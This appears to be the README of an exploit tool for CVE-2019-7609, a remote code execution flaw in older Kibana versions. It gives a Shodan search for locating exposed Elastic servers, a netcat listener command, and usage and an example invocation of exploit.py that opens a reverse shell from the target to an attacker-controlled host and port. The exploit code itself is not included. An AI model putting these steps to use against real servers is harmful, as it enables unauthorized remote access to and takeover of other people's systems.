# CVE-2019-7609

![](https://img.shields.io/static/v1?label=Product&message=Kibana&color=blue)
![](https://img.shields.io/static/v1?label=Version&message= before%205.6.15%20and%206.6.1&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)



 - Shodan dork:
```
product:"Elastic"
```
### Usage
```
nc -nvlp 8888
# python2 exploit.py -h

usage: exploit.py [-h] [-u URL] [-host REMOTE_HOST]
                                   [-port REMOTE_PORT] [--shell]

optional arguments:
  -h, --help         show this help message and exit
  -u URL             such as: http://127.0.0.1:5601
  -host REMOTE_HOST  reverse shell remote host: such as: 1.1.1.1
  -port REMOTE_PORT  reverse shell remote port: such as: 8888
  --shell            reverse shell after verify
```
Ex: `python2 exploit.py -u http://target_IP:5601 -host attacker_IP -port attacker_PORT --shell`